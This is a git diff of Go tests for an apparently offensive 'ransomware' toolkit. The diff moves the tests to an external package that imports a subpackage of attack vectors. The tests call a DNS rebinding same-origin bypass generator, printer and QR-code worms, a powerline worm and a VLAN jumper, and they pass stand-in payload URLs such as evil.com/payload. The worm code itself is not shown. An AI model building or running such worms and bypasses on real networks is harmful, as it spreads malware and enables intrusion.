@@ -1,14 +1,20 @@
-package ransomware
+package ransomware_test
+
+// wfp_test.go — tests the hydra_vectors subpackage (DNS rebinding, PJL, QR,
+// powerline, VLAN). Misplaced in the root package; converted to an external
+// test package that imports hydra_vectors so the tests compile again.
 
 import (
 	"testing"
+
+	ransomware "github.com/ruby570bocadito/x404x/internal/ransomware"
+	hv "github.com/ruby570bocadito/x404x/internal/ransomware/hydra_vectors"
 )
 
 func TestNewDNSRebindingInitialState(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	d := NewDNSRebinding(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	d := hv.NewDNSRebinding(cfg)
 
-	// Test SOP bypass payload generation
 	payload := d.SOPBypassPayload("http://192.168.1.1")
 	if payload == "" {
 		t.Error("SOPBypassPayload returned empty")
@@ -17,10 +23,9 @@ func TestNewDNSRebindingInitialState(t *testing.T) {
 }
 
 func TestDNSRebindingConfig(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	d := NewDNSRebinding(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	d := hv.NewDNSRebinding(cfg)
 
-	// Full suite should work even without network
 	result := d.FullDNSRebindingSuite("http://127.0.0.1:9090")
 	if result == nil {
 		t.Fatal("FullDNSRebindingSuite returned nil")
@@ -31,16 +36,16 @@ func TestDNSRebindingConfig(t *testing.T) {
 }
 
 func TestNewPJLWorm(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPJLWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPJLWorm(cfg)
 	if p == nil {
 		t.Fatal("NewPJLWorm() returned nil")
 	}
 }
 
 func TestPJLWormDiscoverPrinters(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPJLWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPJLWorm(cfg)
 
 	printers, err := p.DiscoverPrinters()
 	if err != nil {
@@ -52,8 +57,8 @@ func TestPJLWormDiscoverPrinters(t *testing.T) {
 }
 
 func TestPJLWormEnumPrinterInfo(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPJLWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPJLWorm(cfg)
 
 	info, err := p.EnumPrinterInfo("192.168.1.100")
 	if err != nil {
@@ -65,8 +70,8 @@ func TestPJLWormEnumPrinterInfo(t *testing.T) {
 }
 
 func TestPJLWormSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPJLWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPJLWorm(cfg)
 
 	result := p.FullPJLWormSuite("http://127.0.0.1:9090")
 	if result == nil {
@@ -78,16 +83,16 @@ func TestPJLWormSuite(t *testing.T) {
 }
 
 func TestNewQRWorm(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	q := NewQRWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	q := hv.NewQRWorm(cfg)
 	if q == nil {
 		t.Fatal("NewQRWorm() returned nil")
 	}
 }
 
 func TestQRWormGenerateQR(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	q := NewQRWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	q := hv.NewQRWorm(cfg)
 
 	path, err := q.GenerateMaliciousQR("http://malware.example.com/payload")
 	if err != nil {
@@ -99,8 +104,8 @@ func TestQRWormGenerateQR(t *testing.T) {
 }
 
 func TestQRWormSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	q := NewQRWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	q := hv.NewQRWorm(cfg)
 
 	result := q.FullQRWormSuite("http://evil.com/payload")
 	if result == nil {
@@ -112,16 +117,16 @@ func TestQRWormSuite(t *testing.T) {
 }
 
 func TestNewPowerlineWorm(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPowerlineWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPowerlineWorm(cfg)
 	if p == nil {
 		t.Fatal("NewPowerlineWorm() returned nil")
 	}
 }
 
 func TestPowerlineSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPowerlineWorm(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	p := hv.NewPowerlineWorm(cfg)
 
 	result := p.FullPowerlineSuite("payload_data")
 	if result == nil {
@@ -133,16 +138,16 @@ func TestPowerlineSuite(t *testing.T) {
 }
 
 func TestNewVLANJumper(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	v := NewVLANJumper(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	v := hv.NewVLANJumper(cfg)
 	if v == nil {
 		t.Fatal("NewVLANJumper() returned nil")
 	}
 }
 
 func TestVLANJumperListInterfaces(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	v := NewVLANJumper(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	v := hv.NewVLANJumper(cfg)
 
 	ifaces := v.ListInterfaces()
 	if len(ifaces) == 0 {
@@ -152,8 +157,8 @@ func TestVLANJumperListInterfaces(t *testing.T) {
 }
 
 func TestVLANJumperSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	v := NewVLANJumper(cfg)
+	cfg := ransomware.DefaultRansomwareConfig()
+	v := hv.NewVLANJumper(cfg)
 
 	result := v.FullVLANJumpSuite()
 	if result == nil {
